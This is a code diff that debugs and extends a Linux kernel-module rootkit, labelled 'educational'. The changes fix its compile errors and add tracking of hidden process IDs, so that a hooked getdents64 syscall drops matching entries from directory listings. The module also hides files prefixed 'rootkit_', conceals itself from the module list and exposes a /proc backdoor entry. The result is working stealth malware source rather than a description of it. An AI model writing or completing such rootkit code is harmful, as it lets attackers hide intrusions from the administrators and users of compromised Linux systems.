@@ -17,13 +17,17 @@
 #include "include/ftrace_helper.h" // in "" because it's a local file, not a system header
 
 MODULE_LICENSE("GPL"); // needed to have kernel allow access to symbols the module needs
-MODULE_AUTHOR("Kizusuita");
+MODULE_AUTHOR("b4$hBunni~:#");
 MODULE_DESCRIPTION("Educational LKM rootkit");
 MODULE_VERSION("1.0");
 
 #define HIDE_PREFIX "rootkit_" // Makes all files starting with rootkit_ hidden in ls
 #define BACKDOOR_ENTRY "rootkit_backdoor" // name of proc entry, show up as "/proc/rootkit_backdoor"
 #define MAX_HIDDEN_PIDS 16
+
+static pid_t hidden_pids[MAX_HIDDEN_PIDS];
+static int hidden_pid_count;
+static DEFINE_SPINLOCK(pid_lock);
 
 // Loops through array looking for match. Acquires the lock before reading, releases after. Return true if found.
 static bool pid_is_hidden(pid_t pid)
@@ -32,7 +36,7 @@ static bool pid_is_hidden(pid_t pid)
     bool found = false;
     spin_lock(&pid_lock);
     for (i = 0; i < hidden_pid_count; i++) {
-        if (hidden_pids[i] == pid0) { found = true; break; }
+        if (hidden_pids[i] == pid) { found = true; break; }
     }
     spin_unlock(&pid_lock);
     return found;
@@ -67,14 +71,16 @@ static int hide_pid(pid_t pid)
  */
 
 #ifdef PTREGS_SYSCALL_STUBS
-typedef asmlinkage long (*orig_getdents64_t)(const struct pr_regs *);
-static orig_getdents64_t orig_getdents64_t;
+typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
+static orig_getdents64_t orig_getdents64;
 
 static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 {
     int fd = (int)regs->di;
     char __user *dirent = (char __user *)regs->si;
     unsigned long count = (unsigned long)regs->dx;
+    (void)fd;
+    (void)count;
 #else
 typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
                                             struct linux_dirent64 __user *,
@@ -83,7 +89,7 @@ static orig_getdents64_t orig_getdents64;
 static asmlinkage long hook_getdents64(unsigned int fd,
                                        struct linux_dirent64 __user *dirent,
                                        unsigned int count)
-}
+{
 #endif
 
 /* This is the main hook
@@ -102,7 +108,6 @@ static asmlinkage long hook_getdents64(unsigned int fd,
     char *kbuf; // kernel-space buffer to copy results to to mod them
     struct linux_dirent64 *cur, *prev; // pointers to walk thru directory entries, cur = current; prev = previous
     unsigned long offset; // tracks position while walking thru buffer
-    pid_t entry_pid;
 
 #ifdef PTREGS_SYSCALL_STUBS
     ret = orig_getdents64(regs);
@@ -166,13 +171,19 @@ static asmlinkage long hook_getdents64(unsigned int fd,
     offset = 0;
 
     while (offset < ret) {
-        cur = (struct linux_dirent64 *)(kbuf + offset)
+        cur = (struct linux_dirent64 *)(kbuf + offset);
         bool hide = false;
 
         if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
             hide = true;
+        {
+            char *endp;
+            long num = simple_strtol(cur->d_name, &endp, 10);
+            if (endp != cur->d_name && pid_is_hidden((pid_t)num))
+                hide = true;
+        }
 
-        if (!hide) {
+        if (hide) {
             if (prev) {
                 prev->d_reclen+= cur->d_reclen;
             } else {
@@ -311,9 +322,10 @@ static ssize_t backdoor_read(struct file *file, char __user *buf,
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
 static const struct proc_ops backdoor_fops = {
     .proc_read = backdoor_read,
-    .write = backdoor_write,
+    .proc_write = backdoor_write,
 };
 #else
+
 static const struct file_operations backdoor_fops = {
     .read = backdoor_read,
     .write = backdoor_write,
@@ -343,7 +355,7 @@ static struct ftrace_hook hooks[] = {
  *                 visible in dmesg.
  */
 
-static int __init rookit_init(void)
+static int __init rootkit_init(void)
 {
     int err;
 
@@ -375,7 +387,7 @@ static int __init rookit_init(void)
 static void __exit rootkit_exit(void)
 {
     module_show();
-    fh_Remove_hooks(hooks, ARRAY_SIZE(hooks));
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     proc_remove(backdoor_proc_entry);
     pr_info("Unloaded cleanly - No issues\n");
 }
